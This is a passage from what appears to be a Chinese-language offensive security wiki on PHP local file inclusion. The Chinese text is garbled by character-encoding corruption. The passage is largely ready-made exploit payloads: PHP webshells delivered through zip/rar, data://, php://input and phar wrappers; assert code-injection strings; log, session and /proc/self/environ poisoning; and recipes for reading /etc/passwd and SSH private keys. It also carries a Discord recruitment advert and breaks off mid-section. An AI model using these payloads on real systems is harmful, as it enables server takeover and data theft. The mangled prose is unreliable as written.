* ç¼–ç  **convert.iconv.UNICODE.CP930** å°†æ¯ä¸ªå­—æ¯è½¬æ¢ä¸ºä¸‹ä¸€ä¸ªå­—æ¯ï¼ˆå› æ­¤åœ¨æ­¤ç¼–ç åï¼ša -> bï¼‰ã€‚è¿™ä½¿æˆ‘ä»¬èƒ½å¤Ÿå‘ç°ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯å¦æ˜¯ `a`ï¼Œä¾‹å¦‚ï¼Œå› ä¸ºå¦‚æœæˆ‘ä»¬åº”ç”¨ 6 æ¬¡æ­¤ç¼–ç  a->b->c->d->e->f->gï¼Œè¯¥å­—æ¯ä¸å†æ˜¯åå…­è¿›åˆ¶å­—ç¬¦ï¼Œå› æ­¤ dechunk ä¸ä¼šåˆ é™¤å®ƒï¼Œphp é”™è¯¯è¢«è§¦å‘ï¼Œå› ä¸ºå®ƒä¸åˆå§‹ç‚¸å¼¹ç›¸ä¹˜ã€‚
* åœ¨å¼€å¤´ä½¿ç”¨å…¶ä»–è½¬æ¢å¦‚ **rot13** å¯ä»¥æ³„éœ²å…¶ä»–å­—ç¬¦å¦‚ n, o, p, q, rï¼ˆå…¶ä»–ç¼–ç å¯ä»¥ç”¨æ¥å°†å…¶ä»–å­—æ¯ç§»åŠ¨åˆ°åå…­è¿›åˆ¶èŒƒå›´ï¼‰ã€‚
* å½“åˆå§‹å­—ç¬¦æ˜¯æ•°å­—æ—¶ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œ base64 ç¼–ç å¹¶æ³„éœ²å‰ä¸¤ä¸ªå­—æ¯ä»¥æ³„éœ²è¯¥æ•°å­—ã€‚
* æœ€åä¸€ä¸ªé—®é¢˜æ˜¯æŸ¥çœ‹ **å¦‚ä½•æ³„éœ²è¶…è¿‡åˆå§‹å­—æ¯**ã€‚é€šè¿‡ä½¿ç”¨é¡ºåºå†…å­˜è¿‡æ»¤å™¨å¦‚ **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** å¯ä»¥æ”¹å˜å­—ç¬¦çš„é¡ºåºï¼Œå¹¶åœ¨ç¬¬ä¸€ä½ç½®è·å–æ–‡æœ¬çš„å…¶ä»–å­—æ¯ã€‚
* ä¸ºäº†èƒ½å¤Ÿè·å– **æ›´å¤šæ•°æ®**ï¼Œæƒ³æ³•æ˜¯ **åœ¨å¼€å¤´ç”Ÿæˆ 2 å­—èŠ‚çš„åƒåœ¾æ•°æ®**ï¼Œä½¿ç”¨ **convert.iconv.UTF16.UTF16**ï¼Œåº”ç”¨ **UCS-4LE** ä½¿å…¶ **ä¸æ¥ä¸‹æ¥çš„ 2 å­—èŠ‚è¿›è¡Œæ¢è½´**ï¼Œå¹¶ **åˆ é™¤æ•°æ®ç›´åˆ°åƒåœ¾æ•°æ®**ï¼ˆè¿™å°†åˆ é™¤åˆå§‹æ–‡æœ¬çš„å‰ 2 å­—èŠ‚ï¼‰ã€‚ç»§ç»­è¿™æ ·åšï¼Œç›´åˆ°è¾¾åˆ°æ‰€éœ€çš„æ³„éœ²ä½ã€‚

åœ¨æ–‡ç« ä¸­è¿˜æ³„éœ²äº†ä¸€ç§è‡ªåŠ¨æ‰§è¡Œæ­¤æ“ä½œçš„å·¥å…·ï¼š[php\_filters\_chain\_oracle\_exploit](https://github.com/synacktiv/php\_filter\_chains\_oracle\_exploit)ã€‚

### php://fd

æ­¤åŒ…è£…å™¨å…è®¸è®¿é—®è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å¯èƒ½å¯¹å¤–æ³„æ‰“å¼€æ–‡ä»¶çš„å†…å®¹æœ‰ç”¨ï¼š
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ **php://stdin, php://stdout å’Œ php://stderr** åˆ†åˆ«è®¿é—® **æ–‡ä»¶æè¿°ç¬¦ 0, 1 å’Œ 2**ï¼ˆä¸ç¡®å®šè¿™åœ¨æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰

### zip:// å’Œ rar://

ä¸Šä¼ ä¸€ä¸ªåŒ…å« PHPShell çš„ Zip æˆ– Rar æ–‡ä»¶å¹¶è®¿é—®å®ƒã€‚\
ä¸ºäº†èƒ½å¤Ÿåˆ©ç”¨ rar åè®®ï¼Œå®ƒ **éœ€è¦è¢«ç‰¹åˆ«æ¿€æ´»**ã€‚
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
æ³¨æ„ï¼Œæ­¤åè®®å— php é…ç½® **`allow_url_open`** å’Œ **`allow_url_include`** çš„é™åˆ¶ã€‚

### expect://

å¿…é¡»æ¿€æ´» Expectã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼æ‰§è¡Œä»£ç ï¼š
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

åœ¨POSTå‚æ•°ä¸­æŒ‡å®šä½ çš„æœ‰æ•ˆè½½è·ï¼š
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

ä¸€ä¸ª `.phar` æ–‡ä»¶å¯ä»¥åœ¨ web åº”ç”¨ç¨‹åºåˆ©ç”¨ `include` ç­‰å‡½æ•°è¿›è¡Œæ–‡ä»¶åŠ è½½æ—¶æ‰§è¡Œ PHP ä»£ç ã€‚ä¸‹é¢æä¾›çš„ PHP ä»£ç ç‰‡æ®µæ¼”ç¤ºäº†å¦‚ä½•åˆ›å»ºä¸€ä¸ª `.phar` æ–‡ä»¶ï¼š
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
è¦ç¼–è¯‘ `.phar` æ–‡ä»¶ï¼Œåº”æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
```bash
php --define phar.readonly=0 create_path.php
```
åœ¨æ‰§è¡Œæ—¶ï¼Œå°†åˆ›å»ºä¸€ä¸ªåä¸º `test.phar` çš„æ–‡ä»¶ï¼Œè¿™å¯èƒ½è¢«åˆ©ç”¨æ¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ã€‚

åœ¨ LFI ä»…æ‰§è¡Œæ–‡ä»¶è¯»å–è€Œä¸æ‰§è¡Œå…¶ä¸­çš„ PHP ä»£ç çš„æƒ…å†µä¸‹ï¼Œé€šè¿‡ `file_get_contents()`ã€`fopen()`ã€`file()`ã€`file_exists()`ã€`md5_file()`ã€`filemtime()` æˆ– `filesize()` ç­‰å‡½æ•°ï¼Œå¯ä»¥å°è¯•åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ã€‚æ­¤æ¼æ´ä¸ä½¿ç”¨ `phar` åè®®è¯»å–æ–‡ä»¶æœ‰å…³ã€‚

æœ‰å…³åœ¨ `.phar` æ–‡ä»¶ä¸Šä¸‹æ–‡ä¸­åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´çš„è¯¦ç»†ç†è§£ï¼Œè¯·å‚é˜…ä»¥ä¸‹é“¾æ¥çš„æ–‡æ¡£ï¼š

[Phar ååºåˆ—åŒ–åˆ©ç”¨æŒ‡å—](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### CVE-2024-2961

å¯ä»¥æ»¥ç”¨ **ä»»ä½•æ”¯æŒ php è¿‡æ»¤å™¨çš„ PHP ä¸­çš„ä»»æ„æ–‡ä»¶è¯»å–** æ¥è·å¾— RCEã€‚è¯¦ç»†æè¿°å¯ä»¥åœ¨ [**æ­¤å¸–å­ä¸­æ‰¾åˆ°**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**ã€‚**\
éå¸¸ç®€è¦çš„æ€»ç»“ï¼šåœ¨ PHP å †ä¸­æ»¥ç”¨ **3 å­—èŠ‚æº¢å‡º** æ¥ **æ›´æ”¹ç‰¹å®šå¤§å°çš„ç©ºé—²å—é“¾**ï¼Œä»¥ä¾¿èƒ½å¤Ÿ **åœ¨ä»»ä½•åœ°å€å†™å…¥ä»»ä½•å†…å®¹**ï¼Œå› æ­¤æ·»åŠ äº†ä¸€ä¸ªé’©å­æ¥è°ƒç”¨ **`system`**ã€‚\
å¯ä»¥é€šè¿‡æ»¥ç”¨æ›´å¤šçš„ php è¿‡æ»¤å™¨æ¥åˆ†é…ç‰¹å®šå¤§å°çš„å—ã€‚

### æ›´å¤šåè®®

æŸ¥çœ‹æ›´å¤šå¯èƒ½çš„ [**åè®®ä»¥åŒ…å«åœ¨æ­¤**](https://www.php.net/manual/en/wrappers.php)**ï¼š**

* [php://memory å’Œ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” åœ¨å†…å­˜æˆ–ä¸´æ—¶æ–‡ä»¶ä¸­å†™å…¥ï¼ˆä¸ç¡®å®šè¿™åœ¨æ–‡ä»¶åŒ…å«æ”»å‡»ä¸­å¦‚ä½•æœ‰ç”¨ï¼‰
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” è®¿é—® HTTP(s) URL
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” è®¿é—® FTP(s) URL
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” å‹ç¼©æµ
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” æŸ¥æ‰¾åŒ¹é…æ¨¡å¼çš„è·¯å¾„åï¼ˆå®ƒä¸è¿”å›ä»»ä½•å¯æ‰“å°çš„å†…å®¹ï¼Œå› æ­¤åœ¨è¿™é‡Œå¹¶ä¸çœŸæ­£æœ‰ç”¨ï¼‰
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” å®‰å…¨å¤–å£³ 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” éŸ³é¢‘æµï¼ˆä¸é€‚åˆè¯»å–ä»»æ„æ–‡ä»¶ï¼‰

## é€šè¿‡ PHP çš„ 'assert' è¿›è¡Œ LFI

åœ¨å¤„ç† 'assert' å‡½æ•°æ—¶ï¼ŒPHP ä¸­çš„æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰é£é™©æ˜¾è‘—è¾ƒé«˜ï¼Œå› ä¸ºå®ƒå¯ä»¥æ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„ä»£ç ã€‚å¦‚æœè¾“å…¥åŒ…å«åƒ ".." è¿™æ ·çš„ç›®å½•éå†å­—ç¬¦è¢«æ£€æŸ¥ä½†æœªæ­£ç¡®æ¸…ç†ï¼Œè¿™å°¤å…¶æˆé—®é¢˜ã€‚

ä¾‹å¦‚ï¼ŒPHP ä»£ç å¯èƒ½è¢«è®¾è®¡ä¸ºé˜²æ­¢ç›®å½•éå†ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```bash
assert("strpos('$file', '..') === false") or die("");
```
è™½ç„¶è¿™æ—¨åœ¨é˜»æ­¢éå†ï¼Œä½†ä¸ç»æ„é—´åˆ›å»ºäº†ä»£ç æ³¨å…¥çš„å‘é‡ã€‚ä¸ºäº†åˆ©ç”¨è¿™ä¸€ç‚¹è¯»å–æ–‡ä»¶å†…å®¹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ï¼š
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
åŒæ ·ï¼Œå¯¹äºæ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨ï¼š
```plaintext
' and die(system("id")) or '
```
é‡è¦çš„æ˜¯è¦**å¯¹è¿™äº›æœ‰æ•ˆè½½è·è¿›è¡ŒURLç¼–ç **ã€‚

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

åŠ å…¥[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)æœåŠ¡å™¨ï¼Œä¸ç»éªŒä¸°å¯Œçš„é»‘å®¢å’Œæ¼æ´èµé‡‘çŒäººäº¤æµï¼

**é»‘å®¢è§è§£**\
å‚ä¸æ·±å…¥æ¢è®¨é»‘å®¢çš„åˆºæ¿€ä¸æŒ‘æˆ˜çš„å†…å®¹

**å®æ—¶é»‘å®¢æ–°é—»**\
é€šè¿‡å®æ—¶æ–°é—»å’Œè§è§£ï¼Œè·Ÿä¸Šå¿«é€Ÿå˜åŒ–çš„é»‘å®¢ä¸–ç•Œ

**æœ€æ–°å…¬å‘Š**\
äº†è§£æœ€æ–°çš„æ¼æ´èµé‡‘å‘å¸ƒå’Œé‡è¦å¹³å°æ›´æ–°

**åŠ å…¥æˆ‘ä»¬** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ï¼Œä»Šå¤©å°±å¼€å§‹ä¸é¡¶çº§é»‘å®¢åˆä½œå§ï¼

## PHPç›²è·¯å¾„éå†

{% hint style="warning" %}
æ­¤æŠ€æœ¯é€‚ç”¨äºæ‚¨**æ§åˆ¶**ä¸€ä¸ª**PHPå‡½æ•°**çš„**æ–‡ä»¶è·¯å¾„**çš„æƒ…å†µï¼Œè¯¥å‡½æ•°å°†**è®¿é—®ä¸€ä¸ªæ–‡ä»¶**ä½†æ‚¨çœ‹ä¸åˆ°æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚ç®€å•è°ƒç”¨**`file()`**ï¼‰ä½†å†…å®¹æœªæ˜¾ç¤ºã€‚
{% endhint %}

åœ¨[**è¿™ç¯‡ç²¾å½©çš„æ–‡ç« **](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html)ä¸­è§£é‡Šäº†å¦‚ä½•é€šè¿‡PHPè¿‡æ»¤å™¨æ»¥ç”¨ç›²è·¯å¾„éå†ä»¥**é€šè¿‡é”™è¯¯oracleæå–æ–‡ä»¶å†…å®¹**ã€‚

æ€»ä¹‹ï¼Œè¯¥æŠ€æœ¯ä½¿ç”¨**"UCS-4LE"ç¼–ç **ä½¿æ–‡ä»¶å†…å®¹å˜å¾—å¦‚æ­¤**åºå¤§**ï¼Œä»¥è‡³äº**æ‰“å¼€**è¯¥æ–‡ä»¶çš„**PHPå‡½æ•°**å°†è§¦å‘ä¸€ä¸ª**é”™è¯¯**ã€‚

ç„¶åï¼Œä¸ºäº†æ³„éœ²ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä½¿ç”¨è¿‡æ»¤å™¨**`dechunk`**ï¼Œä»¥åŠå…¶ä»–å¦‚**base64**æˆ–**rot13**ï¼Œæœ€åä½¿ç”¨è¿‡æ»¤å™¨**convert.iconv.UCS-4.UCS-4LE**å’Œ**convert.iconv.UTF16.UTF-16BE**æ¥**åœ¨å¼€å¤´æ”¾ç½®å…¶ä»–å­—ç¬¦å¹¶æ³„éœ²å®ƒä»¬**ã€‚

**å¯èƒ½å­˜åœ¨æ¼æ´çš„å‡½æ•°**ï¼š`file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (ä»…é™ç›®æ ‡åªè¯»)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

æœ‰å…³æŠ€æœ¯ç»†èŠ‚ï¼Œè¯·æŸ¥çœ‹ä¸Šè¿°æ–‡ç« ï¼

## LFI2RCE

### è¿œç¨‹æ–‡ä»¶åŒ…å«

å¦‚å‰æ‰€è¿°ï¼Œ[**è¯·ç‚¹å‡»æ­¤é“¾æ¥**](./#remote-file-inclusion)ã€‚

### é€šè¿‡Apache/Nginxæ—¥å¿—æ–‡ä»¶

å¦‚æœApacheæˆ–NginxæœåŠ¡å™¨åœ¨åŒ…å«å‡½æ•°ä¸­**æ˜“å—LFIæ”»å‡»**ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—®**`/var/log/apache2/access.log`æˆ–`/var/log/nginx/access.log`**ï¼Œåœ¨**ç”¨æˆ·ä»£ç†**æˆ–**GETå‚æ•°**ä¸­è®¾ç½®ä¸€ä¸ªphp shellï¼Œå¦‚**`<?php system($_GET['c']); ?>`**å¹¶åŒ…å«è¯¥æ–‡ä»¶ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**å¦‚æœæ‚¨ä½¿ç”¨åŒå¼•å·**è€Œä¸æ˜¯**å•å¼•å·**æ¥ç¼–å†™shellï¼ŒåŒå¼•å·å°†è¢«ä¿®æ”¹ä¸ºå­—ç¬¦ä¸²"_**quote;**_"ï¼Œ**PHPå°†åœ¨é‚£é‡ŒæŠ›å‡ºé”™è¯¯**ï¼Œå¹¶ä¸”**ä¸ä¼šæ‰§è¡Œå…¶ä»–ä»»ä½•å†…å®¹**ã€‚

æ­¤å¤–ï¼Œè¯·ç¡®ä¿**æ­£ç¡®ç¼–å†™æœ‰æ•ˆè½½è·**ï¼Œå¦åˆ™æ¯æ¬¡PHPå°è¯•åŠ è½½æ—¥å¿—æ–‡ä»¶æ—¶éƒ½ä¼šå‡ºé”™ï¼Œæ‚¨å°†æ²¡æœ‰ç¬¬äºŒæ¬¡æœºä¼šã€‚
{% endhint %}

è¿™ä¹Ÿå¯ä»¥åœ¨å…¶ä»–æ—¥å¿—ä¸­å®Œæˆï¼Œä½†**è¯·å°å¿ƒï¼Œ**æ—¥å¿—ä¸­çš„ä»£ç å¯èƒ½ä¼šè¢«URLç¼–ç ï¼Œè¿™å¯èƒ½ä¼šç ´åShellã€‚å¤´éƒ¨**æˆæƒ "basic"**åŒ…å«"ç”¨æˆ·:å¯†ç "çš„Base64ç¼–ç ï¼Œå¹¶åœ¨æ—¥å¿—ä¸­è§£ç ã€‚PHPShellå¯ä»¥æ’å…¥åˆ°æ­¤å¤´éƒ¨ä¸­ã€‚\
å…¶ä»–å¯èƒ½çš„æ—¥å¿—è·¯å¾„ï¼š
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### é€šè¿‡ç”µå­é‚®ä»¶

**å‘é€é‚®ä»¶**åˆ°å†…éƒ¨è´¦æˆ· (user@localhost)ï¼ŒåŒ…å«ä½ çš„ PHP è´Ÿè½½ï¼Œå¦‚ `<?php echo system($_REQUEST["cmd"]); ?>`ï¼Œå¹¶å°è¯•åŒ…å«ç”¨æˆ·çš„é‚®ä»¶ï¼Œè·¯å¾„å¦‚ **`/var/mail/<USERNAME>`** æˆ– **`/var/spool/mail/<USERNAME>`**

### é€šè¿‡ /proc/\*/fd/\*

1. ä¸Šä¼ å¤§é‡ shellï¼ˆä¾‹å¦‚ï¼š100ï¼‰
2. åŒ…å« [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD)ï¼Œå…¶ä¸­ $PID = è¿›ç¨‹çš„ PIDï¼ˆå¯ä»¥æš´åŠ›ç ´è§£ï¼‰ï¼Œ$FD æ˜¯æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¹Ÿå¯ä»¥æš´åŠ›ç ´è§£ï¼‰

### é€šè¿‡ /proc/self/environ

åƒæ—¥å¿—æ–‡ä»¶ä¸€æ ·ï¼Œåœ¨ User-Agent ä¸­å‘é€è´Ÿè½½ï¼Œå®ƒå°†åæ˜ åœ¨ /proc/self/environ æ–‡ä»¶ä¸­
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### é€šè¿‡ä¸Šä¼ 

å¦‚æœæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œåªéœ€åœ¨å…¶ä¸­æ³¨å…¥ shell è´Ÿè½½ (ä¾‹å¦‚ï¼š`<?php system($_GET['c']); ?>`)ã€‚
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
ä¸ºäº†ä¿æŒæ–‡ä»¶å¯è¯»ï¼Œæœ€å¥½å°†å…¶æ³¨å…¥åˆ°å›¾ç‰‡/doc/pdf çš„å…ƒæ•°æ®ä¸­ã€‚

### é€šè¿‡ ZIP æ–‡ä»¶ä¸Šä¼ 

ä¸Šä¼ ä¸€ä¸ªåŒ…å«å‹ç¼© PHP shell çš„ ZIP æ–‡ä»¶å¹¶è®¿é—®ï¼š
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### é€šè¿‡ PHP ä¼šè¯

æ£€æŸ¥ç½‘ç«™æ˜¯å¦ä½¿ç”¨ PHP ä¼šè¯ (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
åœ¨ PHP ä¸­ï¼Œè¿™äº›ä¼šè¯å­˜å‚¨åœ¨ _/var/lib/php5/sess\\_\[PHPSESSID]\_ æ–‡ä»¶ä¸­
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
å°† cookie è®¾ç½®ä¸º `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
ä½¿ç”¨ LFI åŒ…å« PHP ä¼šè¯æ–‡ä»¶
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### é€šè¿‡ ssh

å¦‚æœ ssh å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·æ£€æŸ¥æ­£åœ¨ä½¿ç”¨çš„ç”¨æˆ·ï¼ˆ/proc/self/status & /etc/passwdï¼‰ï¼Œå¹¶å°è¯•è®¿é—® **\<HOME>/.ssh/id\_rsa**

### **é€šè¿‡** **vsftpd** _**æ—¥å¿—**_

FTP æœåŠ¡å™¨ vsftpd çš„æ—¥å¿—ä½äº _**/var/log/vsftpd.log**_ã€‚åœ¨å­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´çš„æƒ…å†µä¸‹ï¼Œå¹¶ä¸”å¯ä»¥è®¿é—®æš´éœ²çš„ vsftpd æœåŠ¡å™¨ï¼Œå¯ä»¥è€ƒè™‘ä»¥ä¸‹æ­¥éª¤ï¼š

1. åœ¨ç™»å½•è¿‡ç¨‹ä¸­å°† PHP æœ‰æ•ˆè´Ÿè½½æ³¨å…¥åˆ°ç”¨æˆ·åå­—æ®µä¸­ã€‚
2. æ³¨å…¥åï¼Œåˆ©ç”¨ LFI ä» _**/var/log/vsftpd.log**_ æ£€ç´¢æœåŠ¡å™¨æ—¥å¿—ã€‚

### é€šè¿‡ php base64 è¿‡æ»¤å™¨ï¼ˆä½¿ç”¨ base64ï¼‰

å¦‚ [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) æ–‡ç« æ‰€ç¤ºï¼ŒPHP base64 è¿‡æ»¤å™¨åªä¼šå¿½ç•¥é base64ã€‚æ‚¨å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ç»•è¿‡æ–‡ä»¶æ‰©å±•åæ£€æŸ¥ï¼šå¦‚æœæ‚¨æä¾›ä»¥ ".php" ç»“å°¾çš„ base64ï¼Œå®ƒåªä¼šå¿½ç•¥ "." å¹¶å°† "php" é™„åŠ åˆ° base64ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ‰æ•ˆè´Ÿè½½ç¤ºä¾‹ï¼š
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### é€šè¿‡ php è¿‡æ»¤å™¨ï¼ˆæ— éœ€æ–‡ä»¶ï¼‰

è¿™ä¸ª [**å†™ä½œ**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) è§£é‡Šäº†ä½ å¯ä»¥ä½¿ç”¨ **php è¿‡æ»¤å™¨ç”Ÿæˆä»»æ„å†…å®¹** ä½œä¸ºè¾“å‡ºã€‚è¿™åŸºæœ¬ä¸Šæ„å‘³ç€ä½ å¯ä»¥ **ç”Ÿæˆä»»æ„ php ä»£ç ** è¿›è¡ŒåŒ…å« **è€Œæ— éœ€å°†å…¶å†™å…¥** æ–‡ä»¶ã€‚

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### é€šè¿‡æ®µé”™è¯¯

**ä¸Šä¼ ** ä¸€ä¸ªå°†è¢«å­˜å‚¨ä¸º **ä¸´æ—¶** æ–‡ä»¶åœ¨ `/tmp`ï¼Œç„¶ååœ¨ **åŒä¸€è¯·æ±‚ä¸­** è§¦å‘ **æ®µé”™è¯¯**ï¼Œç„¶å **ä¸´æ—¶æ–‡ä»¶å°†ä¸ä¼šè¢«åˆ é™¤**ï¼Œä½ å¯ä»¥æœç´¢å®ƒã€‚

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### é€šè¿‡ Nginx ä¸´æ—¶æ–‡ä»¶å­˜å‚¨

å¦‚æœä½ å‘ç°äº† **æœ¬åœ°æ–‡ä»¶åŒ…å«** å¹¶ä¸” **Nginx** åœ¨ PHP å‰é¢è¿è¡Œï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡ä»¥ä¸‹æŠ€æœ¯è·å¾— RCEï¼š

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### é€šè¿‡ PHP_SESSION_UPLOAD_PROGRESS

å¦‚æœä½ å‘ç°äº† **æœ¬åœ°æ–‡ä»¶åŒ…å«** å³ä½¿ä½  **æ²¡æœ‰ä¼šè¯** å¹¶ä¸” `session.auto_start` æ˜¯ `Off`ã€‚å¦‚æœä½ åœ¨ **multipart POST** æ•°æ®ä¸­æä¾› **`PHP_SESSION_UPLOAD_PROGRESS`**ï¼ŒPHP å°† **ä¸ºä½ å¯ç”¨ä¼šè¯**ã€‚ä½ å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è·å¾— RCEï¼š

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### é€šè¿‡ Windows ä¸­çš„ä¸´æ—¶æ–‡ä»¶ä¸Šä¼ 

å¦‚æœä½ å‘ç°äº† **æœ¬åœ°æ–‡ä»¶åŒ…å«** å¹¶ä¸”æœåŠ¡å™¨åœ¨ **Windows** ä¸­è¿è¡Œï¼Œä½ å¯èƒ½ä¼šè·å¾— RCEï¼š

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### é€šè¿‡ `pearcmd.php` + URL å‚æ•°

æ­£å¦‚ [**åœ¨è¿™ç¯‡æ–‡ç« ä¸­è§£é‡Šçš„**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp)ï¼Œè„šæœ¬ `/usr/local/lib/phppearcmd.php` åœ¨ php docker é•œåƒä¸­é»˜è®¤å­˜åœ¨ã€‚æ­¤å¤–ï¼Œå¯ä»¥é€šè¿‡ URL å‘è„šæœ¬ä¼ é€’å‚æ•°ï¼Œå› ä¸ºå®ƒè¡¨æ˜å¦‚æœ URL å‚æ•°æ²¡æœ‰ `=`ï¼Œåˆ™åº”å°†å…¶ç”¨ä½œå‚æ•°ã€‚

ä»¥ä¸‹è¯·æ±‚åœ¨ `/tmp/hello.php` ä¸­åˆ›å»ºä¸€ä¸ªå†…å®¹ä¸º `<?=phpinfo()?>` çš„æ–‡ä»¶ï¼š

{% code overflow="wrap" %}
